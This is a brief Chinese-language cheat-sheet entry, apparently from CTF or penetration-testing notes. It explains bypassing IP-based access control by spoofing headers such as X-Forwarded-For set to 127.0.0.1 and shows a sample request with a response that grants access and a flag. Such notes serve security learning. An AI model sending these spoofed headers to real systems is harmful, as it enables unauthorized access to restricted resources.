＃IP访问控制

尝试在请求中使用以下标头绕过IP访问控制：

* X-Originating-IP: 127.0.0.1
* X-Forwarded-For: 127.0.0.1
* X-Remote-IP: 127.0.0.1
* X-Remote-Addr: 127.0.0.1

Example:
```
GET /index.php HTTP/1.1
Host: site.com
X-Forwarded-For: 127.0.0.1
Connection: keep-alive
```

Response:
```
Your IP address is 127.0.0.1<br>
Access granted. Flag is ...
```
